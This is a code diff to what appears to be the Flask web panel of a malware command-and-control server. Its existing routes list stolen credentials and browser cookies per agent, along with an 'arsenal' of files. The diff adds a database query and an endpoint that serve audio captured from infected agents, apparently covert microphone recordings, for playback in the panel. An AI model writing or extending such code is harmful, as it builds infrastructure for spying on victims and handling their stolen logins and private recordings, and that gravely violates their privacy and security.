@@ -372,11 +372,16 @@ def init_view_routes(app):
             
             cookies_data.append(row_dict)
         
+        # Query for audio captures
+        c.execute("SELECT id, agent_id, timestamp FROM audio_captures ORDER BY timestamp DESC")
+        audio_captures = [dict(zip(['id', 'agent_id', 'timestamp'], row)) for row in c.fetchall()]
+
         conn.close()
         
         return render_template('credentials.html', 
                             credentials=credentials,
                             cookies_data=cookies_data,
+                            audio_captures=audio_captures,
                             browser_filter=browser_filter)
 
     @app.route('/tasks')
@@ -406,4 +411,23 @@ def init_view_routes(app):
                     'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                 })
         return render_template('arsenal.html', files=files)
+
+    @app.route('/audio_capture/<int:capture_id>')
+    @login_required
+    def get_audio_capture(capture_id):
+        conn = sqlite3.connect(CONFIG.database)
+        c = conn.cursor()
+        c.execute("SELECT audio FROM audio_captures WHERE id=?", (capture_id,))
+        result = c.fetchone()
+        conn.close()
+        
+        if not result or not result[0]:
+            return "Audio capture not found", 404
+        
+        return send_file(
+            io.BytesIO(result[0]),
+            mimetype='audio/wav',
+            as_attachment=False,
+            download_name=f"audio_{capture_id}.wav"
+        )
     
